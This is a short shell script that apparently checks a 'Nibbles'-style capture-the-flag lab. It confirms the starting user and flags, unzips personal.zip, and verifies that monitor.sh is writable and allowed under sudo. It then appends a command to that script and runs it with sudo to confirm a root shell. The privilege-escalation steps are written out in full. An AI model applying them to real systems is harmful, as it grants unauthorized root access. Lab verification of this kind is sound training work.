#!/bin/sh
set -eu
test "$(id -u)" = 1001
test -r /home/nibbler/user.txt
if test -r /root/root.txt; then
  echo "FAIL: Root flag exposed before sudo escalation" >&2
  exit 1
fi
test ! -e /home/nibbler/personal/stuff/monitor.sh
cd /home/nibbler
unzip -q personal.zip
test -w personal/stuff/monitor.sh
test -x personal/stuff/monitor.sh
sudo -n -l | grep -Fq '/home/nibbler/personal/stuff/monitor.sh'
printf '\n/usr/bin/id > /tmp/nibbles-native-root-proof\n' >> personal/stuff/monitor.sh
sudo -n /home/nibbler/personal/stuff/monitor.sh >/tmp/nibbles-monitor.log
grep -q 'uid=0(root)' /tmp/nibbles-native-root-proof
echo "PASS: user-owned ZIP -> writable monitor script -> genuine sudo UID 0"
